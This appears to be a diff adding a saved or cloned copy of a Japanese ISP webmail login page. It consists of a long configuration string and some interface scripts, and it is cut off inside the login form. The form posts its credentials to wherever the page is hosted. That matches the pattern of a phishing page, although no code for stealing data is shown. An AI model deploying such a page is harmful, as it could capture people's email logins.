@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html class="x-strict x-viewport"><head>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+ 
+
+
+
+
+<script language="Javascript1.1">
+function getBootstrapConfig() {
+return "<bootstrap><common><boolean_showDateFormat value=\"false\" \/><string_redirectLogoutUrl value=\"index.html\" \/><number_windowStateSaveDelay value=\"-1\" \/><string_defaultTimeZone value=\"Asia\/Tokyo\" \/><string_logourl value=\"http:\/\/owmessaging.com\" \/><string_mediastreamerappname value=\"\/mediastreamer\/voicemail\/\" \/><number_minuteScale value=\"5\" \/><string_redirectLoginUrl value=\"\" \/><string_helpurlfortouch value=\"help\/Default.htm\" \/><xml_footerLinks value=\"&lt;footerLinks&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/emailmanagement&quot; text=&quot;MANAGE_YOUR_MAIL&quot; \/&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/contact&quot; text=&quot;CONTACT_US&quot; \/&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/feedback&quot; text=&quot;SEND_US_FEEDBACK&quot; \/&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/privacy-policy&quot; text=&quot;PRIVACY_POLICY&quot; \/&gt;&#xD;&#xA;                &lt;link href=&quot;http:\/\/www.cp.net\/terms-and-conditions&quot; text=&quot;TERMS_CONDITIONS&quot; \/&gt;&#xD;&#xA;            &#xD;&#xA;            &lt;link href=&quot;help\/touch\/index.html&quot; text=&quot;HELP&quot; \/&gt;&#xD;&#xA;        &lt;\/footerLinks&gt;\" \/><xml_skins value=\"&lt;skins \/&gt;\" \/><string_mediastreamerport value=\"8080\" \/><string_desktopappurl value=\"index.jsp\" \/><number_failedLoginLimit value=\"-1\" \/><number_userInactiveTimeout value=\"120000\" \/><string_userDomain value=\"mx.internal\" \/><number_adRotationInterval value=\"30000\" \/><boolean_showTasksApp value=\"true\" \/><string_feedbacktarget value=\"\" \/><string_defaultDateFormat value=\"DD\/MM\/YYYY\" \/><boolean_showLanguageSetting value=\"false\" \/><string_redirectTimeoutUrl value=\"index.html\" \/><string_advertisementLink value=\"\" \/><string_mediastreamer value=\"localhost\" \/><string_searchResultTargetWindowName value=\"searchResult\" \/><string_helpurl value=\"help\/Default.htm\" \/><xml_dataValidation value=\"&lt;dataValidation&gt;&#xD;&#xA;                &lt;phone regexp=&quot;^[\\w-#\\(\\)\\+\\\/\\.\\*]{0,20}$&quot; \/&gt;&#xD;&#xA;                &lt;pager regexp=&quot;^[0-9]{0,50}$&quot; \/&gt;&#xD;&#xA;            &lt;\/dataValidation&gt;\" \/><xml_fileTypesDisplayAudioPlayer value=\"&lt;fileTypesDisplayAudioPlayer&gt;&#xD;&#xA;                &lt;Firefox&gt;ogg&lt;\/Firefox&gt;&#xD;&#xA;                &lt;Safari&gt;mpeg,mp3&lt;\/Safari&gt;&#xD;&#xA;                &lt;IE&gt;mpeg,mp3&lt;\/IE&gt;&#xD;&#xA;                &lt;Chrome&gt;mpeg,mp3&lt;\/Chrome&gt;&#xD;&#xA;            &lt;\/fileTypesDisplayAudioPlayer&gt;\" \/><number_warnBeforeTokenExpiresTime value=\"120000\" \/><string_services value=\"mail.vacationMessage-json,notification-json,mail.message-json,mail,datastore,serviceProfile-json,mediaTranscoderErrorReporter,mail.mobileSignature-json,calendar.share-json,mail.folder-json,mail.category.message-json,log-json,mailFilter,mailSignature,mobileMailSignature,captcha-json,mail.externalAccount-json,mailVacationMessage,mail.trustedSender-json,version-json,auth-json,clientconfig-json,calendar.toDo-json,calendar-json,trustedsender,mail.signature-json,blockedsender,mailAlias,mail.alias-json,storage.account-json,calendar.preference-json,device-json,mail.userControls-json,mailExternalAccount.oauth2code-json,log,calendar.reminderaddress-json,mail.preference-json,timezone,storage.file-json,contacts.addressBook-json,mailPreference,bootstrap,bootstrap-json,sms-json,mailJunkPreference,noop,mail.message.attachment-json,auth.nc-json,resource-json,noop-json,calendar.taskList-json,allowedsender,mailExternalAccount,mail.blockedSender-json,user-json,addressbooks,metrics-json,mail.junkPreference-json,storage.authentication-json,contacts-json,api-json,pickup-json,mailForwarding,calendar,calendar.event-json,datastore-json,autocomplete,oembed,storage.folder-json,mail.attachmentView-json,smsAccount-json,prefs,mail.collectedAddress-json,mail.allowedSender-json,prefs-json,fileUpload-json,officePreview-json,timezone-json,user,contacts,mail.filter-json,mail.forwarding-json\" \/><\/common><upload><number_maxBatchSize value=\"1073741824\" \/><number_maxFileSize value=\"-1\" \/><\/upload><mail><xml_specialFolders value=\"&lt;specialFolders caseSensitive=&quot;true&quot; useServerTypes=&quot;false&quot;&gt;&#xD;&#xA;            &lt;inbox name=&quot;Inbox&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;            &lt;draft name=&quot;Drafts&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;            &lt;sent name=&quot;Sent&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;            &lt;junk name=&quot;Junk&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;            &lt;trash name=&quot;Trash&quot; isMessageDropTarget=&quot;true&quot; isFolderDropTarget=&quot;false&quot; \/&gt;&#xD;&#xA;&#x9;&lt;\/specialFolders&gt;\" \/><number_maxuploadbytes value=\"104857600\" \/><number_maxallowedsenders value=\"10\" \/><xml_autoCheck value=\"&lt;autoCheck&gt;&#xD;&#xA;                &lt;interval value=&quot;0&quot;&gt;sdk.mail.autoCheck.manually&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;60&quot;&gt;sdk.mail.autoCheck.everyMinute&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;300&quot;&gt;sdk.mail.autoCheck.everyFiveMinutes&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;900&quot;&gt;sdk.mail.autoCheck.everyFifteenMinutes&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;1800&quot;&gt;sdk.mail.autoCheck.everyThirtyMinutes&lt;\/interval&gt;&#xD;&#xA;                &lt;interval value=&quot;3600&quot;&gt;sdk.mail.autoCheck.everyHour&lt;\/interval&gt;&#xD;&#xA;            &lt;\/autoCheck&gt;\" \/><number_maxblockedsenders value=\"10\" \/><number_autoSaveTime value=\"60000\" \/><string_includedDomain value=\"\" \/><number_emailMaximum value=\"104857600\" \/><boolean_vacationMessageReplyOption value=\"false\" \/><xml_externalmailbox value=\"&lt;externalmailbox pop=&quot;true&quot; imap=&quot;true&quot; smtp=&quot;local&quot; accountLimit=&quot;12&quot; useExternalServerTypes=&quot;false&quot;&gt;&#xD;&#xA;                &lt;service name=&quot;aol&quot; display=&quot;AOL (POP)&quot; type=&quot;pop&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.aol.com&quot; port=&quot;587&quot; \/&gt;&lt;!-- only used when smtp=remote --&gt;&#xD;&#xA;                    &lt;protocol type=&quot;pop&quot; server=&quot;pop.aol.com&quot; port=&quot;110&quot; usessl=&quot;false&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;                &lt;service name=&quot;aol&quot; display=&quot;AOL (IMAP)&quot; type=&quot;imap&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.aol.com&quot; port=&quot;587&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;imap&quot; server=&quot;imap.aol.com&quot; port=&quot;143&quot; usessl=&quot;false&quot; \/&gt;&#xD;&#xA;                    &lt;imapFolderMapping imapDrafts=&quot;Drafts&quot; imapSent=&quot;Sent Items&quot; imapTrash=&quot;Trash&quot; imapJunk=&quot;Junk&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;&#xD;&#xA;                &lt;service name=&quot;gmail&quot; display=&quot;Google GMail (POP)&quot; type=&quot;pop&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.gmail.com&quot; port=&quot;465&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;pop&quot; server=&quot;pop.gmail.com&quot; port=&quot;995&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;                &lt;service name=&quot;gmail&quot; display=&quot;Google GMail (IMAP)&quot; type=&quot;imap&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.gmail.com&quot; port=&quot;587&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;imap&quot; server=&quot;imap.gmail.com&quot; port=&quot;993&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;imapFolderMapping imapDrafts=&quot;[Gmail]\/Drafts&quot; imapSent=&quot;[Gmail]\/Sent Mail&quot; imapTrash=&quot;[Gmail]\/Trash&quot; imapJunk=&quot;[Gmail]\/Spam&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;&#xD;&#xA;                &lt;service name=&quot;yahoo&quot; display=&quot;Yahoo! Plus (POP)&quot; type=&quot;pop&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.mail.yahoo.com&quot; port=&quot;465&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;pop&quot; server=&quot;pop.mail.yahoo.com&quot; port=&quot;995&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;                &lt;service name=&quot;yahoo&quot; display=&quot;Yahoo! Plus (IMAP)&quot; type=&quot;imap&quot;&gt;&#xD;&#xA;                    &lt;protocol type=&quot;smtp&quot; server=&quot;smtp.mail.yahoo.com&quot; port=&quot;465&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;protocol type=&quot;imap&quot; server=&quot;imap.mail.yahoo.com&quot; port=&quot;993&quot; usessl=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;imapFolderMapping imapDrafts=&quot;Draft&quot; imapSent=&quot;Sent&quot; imapTrash=&quot;Trash&quot; imapJunk=&quot;Bulk Mail&quot; \/&gt;&#xD;&#xA;                &lt;\/service&gt;&#xD;&#xA;&#xD;&#xA;                &lt;defaultImapFolderMapping imapDrafts=&quot;Drafts&quot; imapSent=&quot;Sent&quot; imapTrash=&quot;Trash&quot; imapJunk=&quot;Junk&quot; \/&gt;&#xD;&#xA;                &lt;popUidHeaderName value=&quot;X-POP-UID&quot; \/&gt;&#xD;&#xA;            &lt;\/externalmailbox&gt;\" \/><number_maxtrustedsenders value=\"10\" \/><number_headerfetchcount value=\"100\" \/><\/mail><contacts><boolean_allowDuplicateGroupName value=\"true\" \/><number_maxAddressBookLabelLength value=\"32\" \/><number_maxAddressBooks value=\"1000\" \/><number_maxMailingListLabelLength value=\"100\" \/><number_pagesize value=\"300\" \/><boolean_enableGroupContacts value=\"true\" \/><boolean_enableGroupEmails value=\"true\" \/><boolean_enableCollectedEmails value=\"true\" \/><boolean_enableCreateAddressBooks value=\"true\" \/><string_contactitemDisplayTypes value=\"lzEmail\" \/><string_contactMinimumRequiredSection value=\"lzEmail\" \/><string_mapRootURL value=\"http:\/\/maps.googleapis.com\/maps\/api\/js?sensor=false\" \/><xml_directoryServices value=\"&lt;directoryServices limit=&quot;10&quot;&gt;&#xD;&#xA;            &lt;service name=&quot;example&quot; display=&quot;Directory Service&quot;&gt;&#xD;&#xA;                &lt;connectivity server=&quot;ldap.example.com&quot; port=&quot;389&quot; \/&gt;&#xD;&#xA;                &lt;protocol baseDn=&quot;dc=com&quot; scope=&quot;subtree&quot; maxResults=&quot;100&quot; \/&gt;&#xD;&#xA;                &lt;authentication secure=&quot;false&quot; login=&quot;false&quot; bindDn=&quot;&quot; bindPassword=&quot;&quot; \/&gt;&#xD;&#xA;            &lt;\/service&gt;&#xD;&#xA;        &lt;\/directoryServices&gt;\" \/><number_maxCollectedEmails value=\"10000\" \/><xml_contactForm value=\"&lt;contactForm forceAllFieldsVisible=&quot;true&quot; addFieldControl=&quot;selectionList&quot;&gt;&#xD;&#xA;                &lt;section type=&quot;lzHeader&quot; showmiddlename=&quot;false&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;phoneticlastname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;lastname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;phoneticfirstname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;firstname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;middlename&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;nickname&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;title&quot; displayByDefault=&quot;false&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;department&quot; displayByDefault=&quot;false&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;company&quot; displayByDefault=&quot;false&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;&#xD;&#xA;               &lt;section type=&quot;lzEmail&quot; title=&quot;Email&quot; validator=&quot;email&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; defaultEmail=&quot;true&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzPhone_mobile&quot; title=&quot;Mobile&quot; validator=&quot;phone&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzPhone&quot; title=&quot;Phone&quot; validator=&quot;phone&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzAddress&quot; title=&quot;Address&quot; groupLabel=&quot;home,work,other&quot; showmap=&quot;true&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;zip&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;state&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;city&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;street&quot; type=&quot;textarea&quot; rows=&quot;2&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;country&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzPersonal&quot; title=&quot;Personal&quot; allowDuplicates=&quot;false&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;birthday&quot; type=&quot;date&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;anniversary&quot; type=&quot;date&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzPhone_fax&quot; title=&quot;Fax&quot; validator=&quot;phone&quot; displayByDefault=&quot;false&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzWeb&quot; title=&quot;Website&quot; displayByDefault=&quot;false&quot; validator=&quot;url&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;home&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;work&quot; \/&gt;&#xD;&#xA;                    &lt;input name=&quot;other&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;                &lt;!-- The optional section as a placeholder of job related optional fields in header section. --&gt;&#xD;&#xA;                &lt;!-- &lt;section title=&quot;Job&quot; displayByDefault=&quot;false&quot; \/&gt; --&gt;&#xD;&#xA;&#xD;&#xA;                &lt;section type=&quot;lzNote&quot; title=&quot;Notes&quot; displayByDefault=&quot;false&quot; allowDuplicates=&quot;false&quot;&gt;&#xD;&#xA;                    &lt;input name=&quot;notes&quot; type=&quot;textarea&quot; maxlength=&quot;10240&quot; \/&gt;&#xD;&#xA;                &lt;\/section&gt;&#xD;&#xA;&#xD;&#xA;            &lt;\/contactForm&gt;\" \/><number_delLargeContactWarning value=\"50\" \/><boolean_enableMailingList value=\"false\" \/><boolean_enableContactDeduplication value=\"true\" \/><\/contacts><calendar><number_weekstart value=\"7\" \/><boolean_enableFreeBusyStatus value=\"false\" \/><boolean_showpublishedcalendar value=\"true\" \/><number_maxeventnamelength value=\"64\" \/><boolean_rsvpEnabled value=\"true\" \/><number_daystart value=\"8\" \/><number_maxuploadbytes value=\"5242880\" \/><xml_recurrence value=\"&lt;recurrence&gt;&#xD;&#xA;                &lt;repeat value=&quot;never&quot; label=&quot;Locale.calendar.editorView.recurrence.NEVER&quot; \/&gt;&#xD;&#xA;                &lt;repeat value=&quot;daily&quot; label=&quot;Locale.calendar.editorView.recurrence.DAILY&quot; \/&gt;&#xD;&#xA;                &lt;repeat value=&quot;weekly&quot; label=&quot;Locale.calendar.editorView.recurrence.WEEKLY&quot; \/&gt;&#xD;&#xA;                &lt;repeat value=&quot;monthly&quot; label=&quot;Locale.calendar.editorView.recurrence.MONTHLY&quot; \/&gt;&#xD;&#xA;                &lt;repeat value=&quot;yearly&quot; label=&quot;Locale.calendar.editorView.recurrence.YEARLY&quot; \/&gt;&#xD;&#xA;            &lt;\/recurrence&gt;\" \/><string_allowCalDomain value=\"mirapoint.qa.laszlosystems.com,test.com\" \/><number_maxsubscriptions value=\"10\" \/><boolean_showsharedcalendar value=\"true\" \/><number_maxcalendarnamelength value=\"767\" \/><number_dayend value=\"18\" \/><number_maxeventnoteslength value=\"4096\" \/><number_maxRepSingleEvent value=\"50\" \/><\/calendar><extensionnametypemap><xml_extensionNameTypeMap value=\"&lt;extensionNameTypeMap&gt;&#xD;&#xA;        &lt;!-- Images --&gt;&#xD;&#xA;        &lt;item type=&quot;img_generic&quot; preview=&quot;true&quot; transcode=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                jpg,jpeg&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;img_png&quot; preview=&quot;true&quot; transcode=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                png&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;img_gif&quot; preview=&quot;true&quot; transcode=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                gif&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;psd&quot; preview=&quot;false&quot; transcode=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                psd&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;!-- Preview with media server --&gt;&#xD;&#xA;        &lt;item type=&quot;doc&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                doc,docm,docx,dotm,dotx,rtf,xlt&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;txt&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                txt&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;ppt&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                ppt,pot,potm,potx,pps,pptx&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;sheets&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                xls,xlsb,xlsm,xlsx,xlt,xltm,xltx,xlw&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;pdf&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                pdf&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;java&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                java&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;!-- Client support preview --&gt;&#xD;&#xA;        &lt;item type=&quot;eml&quot; preview=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                eml&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;ics&quot; preview=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                ics&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;vcf&quot; preview=&quot;true&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                vcf&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;!-- Media file types --&gt;&#xD;&#xA;        &lt;item type=&quot;audio&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                mp3,wav&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;mov&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                mov&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;video&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                mp4,3gp,3g2,mpeg,avi&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;!-- Not support preview --&gt;&#xD;&#xA;        &lt;item type=&quot;zip&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                zip,rar,7z,tar,iso&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;exe&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                exe&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;        &lt;item type=&quot;mms&quot; preview=&quot;false&quot;&gt;&#xD;&#xA;            &lt;extensionNames&gt;&#xD;&#xA;                mms&#xD;&#xA;            &lt;\/extensionNames&gt;&#xD;&#xA;        &lt;\/item&gt;&#xD;&#xA;    &#xD;&#xA;            &lt;item type=&quot;xml&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;                &lt;extensionNames&gt;&#xD;&#xA;                    xml&#xD;&#xA;                &lt;\/extensionNames&gt;&#xD;&#xA;            &lt;\/item&gt;&#xD;&#xA;            &lt;item type=&quot;csv&quot; preview=&quot;true&quot; transcode=&quot;true&quot;&gt;&#xD;&#xA;                &lt;extensionNames&gt;&#xD;&#xA;                    csv&#xD;&#xA;                &lt;\/extensionNames&gt;&#xD;&#xA;            &lt;\/item&gt;&#xD;&#xA;        &lt;\/extensionNameTypeMap&gt;\" \/><\/extensionnametypemap><\/bootstrap>";
+}
+
+/**
+* Utility which recursively merges one object into an existing object.
+* This is used for overlaying locales and custom configs before Ext.Object.merge
+* being available. If the object has 'overwrite' property defined, object overwriting will be performed
+* instead of merging.
+*/
+function mergeObj (obj1, obj2) {
+for (var p in obj2) {
+try {
+if ((obj2[p].constructor == Object) && (obj2[p].overwrite != true)) {
+ obj1[p] = mergeObj(obj1[p], obj2[p]);
+} else {
+ obj1[p] = obj2[p];
+}
+} catch(e) {
+obj1[p] = obj2[p];
+}
+}
+
+return obj1;
+}
+</script>
+
+<!-- Load client config, custom settings, and localization.
+The order of these files is not interchangable. -->
+<script type="text/javascript" src="https://wm.secure.ne.jp/webmail/client-config.js?v=KDDIUX_1.2-2" charset="UTF-8"></script>
+<script type="text/javascript" src="https://wm.secure.ne.jp/webmail/custom-config.js?v=KDDIUX_1.2-2" charset="UTF-8"></script>
+<script type="text/javascript" src="https://wm.secure.ne.jp/webmail/resources/locale/localization.js?v=KDDIUX_1.2-2"></script><script type="text/javascript" src="resources/locale/sdk/ja_JP.js" charset="UTF-8"></script><script type="text/javascript" src="https://wm.secure.ne.jp/webmail/resources/locale/custom/ja_JP.js" charset="UTF-8"></script><script type="text/javascript" src="https://wm.secure.ne.jp/webmail/resources/locale/custom/kwc_custom_ja_JP.js" charset="UTF-8"></script><script type="text/javascript" src="https://wm.secure.ne.jp/webmail/resources/locale/custom/kwc_ja_JP.js" charset="UTF-8"></script>
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+<!-- KDDIUX-20 -->
+<script type="text/javascript">
+
+var registerKeyDowns = function () {
+
+document.onkeydown = function (e) {
+if (WebtopConfig.ui.rui.mail.enableKeyboardDeleteKey) {
+//KDDIUX-20 (Delete key)
+if (e && e.keyCode == 46){
+
+ var mailToolbarCtrl = Richui.getApplication().getController("mail.MailToolbar");
+ var toolbar = mailToolbarCtrl.getActiveListToolbar();
+
+ var delBtnVisible = toolbar.down("#delete").isVisible(true);
+
+ var openComposer = Ext.dom.Query.select('.x-window.rui-mail-compose:not(.x-hide-offsets)').length > 0;
+
+ // Only trigger if the delete button is visible and the composer is open
+ if(delBtnVisible && !openComposer) {
+     var selection = toolbar.records;
+
+     var parentMsg = MailManager.isConversation && toolbar.isSingleItem && selection[0].getParentMsg();
+
+     mailToolbarCtrl.doDelete(selection, parentMsg);
+
+     e.preventDefault();
+ }
+
+}
+}
+
+
+
+};
+
+};
+
+
+
+var checkExistsRichui = setInterval(function() {
+if (window.Richui) {
+clearInterval(checkExistsRichui);
+registerKeyDowns();
+
+}
+}, 100);
+
+
+
+
+
+</script>
+
+
+
+<title>WebMail</title><link rel="shortcut icon" href="https://wm.zaq.ne.jp/webmail/resources/images/jcomzaq/favicon.ico" type="image/x-icon"><link rel="icon" href="https://wm.secure.ne.jp/webmail/resources/images/kwc/favicon.ico" type="image/x-icon">
+
+
+<link rel="stylesheet" href="https://wm.secure.ne.jp/webmail/richui/ux.css">
+
+
+
+
+
+
+<link rel="stylesheet" href="https://wm.secure.ne.jp/webmail/resources/ext-theme-kwc-Richui-all.css?v=KDDIUX_1.2-2">
+
+<script type="text/javascript" href="https://wm.secure.ne.jp/webmail/richui/ux.js"></script>
+<script type="text/javascript" href="https://wm.secure.ne.jp/webmail/richui/app.js?v=KDDIUX_1.2-2"></script>
+<style>
+	.rui-core-login-title-app {
+		background-image: url('https://wm.zaq.ne.jp/webmail/resources/images/core/logo_login_jcomzaq.png') !important;
+	}
+</style>
+</head>
+<body id="ext-gen1019" style="overflow: hidden;" class="x-body x-webkit x-chrome x-mac x-layout-fit x-border-box x-container x-ltr x-container-default">
+	<div class="x-container rui-core-background x-fit-item x-ltr x-container-default" id="loginContainer-1014" style="margin: 0px; width: 1440px; height: 813px;">
+		<span id="loginContainer-1014-outerCt" style="display: table; width: 100%; table-layout: fixed; height: 100%;" role="presentation">
+			<div id="loginContainer-1014-innerCt" style="display:table-cell;height:100%;vertical-align:top;" class="" role="presentation">
+				<form class="x-panel rui-core-login-container x-ltr x-panel-default" method="POST" action="" id="form-1015" style="height: 456px;">
+					<div id="form-1015-body" class="x-panel-body x-panel-body-default x-panel-body-default x-docked-noborder-top x-docked-noborder-right x-docked-noborder-bottom x-docked-noborder-left" role="presentation" style="left: 0px; top: 0px; width: 332px; height: 456px;">
+						<table id="form-1015-formTable" class="x-form-layout-table" style="width:100%" cellpadding="0" role="presentation">
+							<tbody role="presentation">
+								<tr role="presentation">
+									<td role="presentation" colspan="3" style="width:100%" id="ext-gen1088">
+										<div class="x-container rui-core-login-title x-ltr x-container-default" style="border-width:0;" id="container-1016">
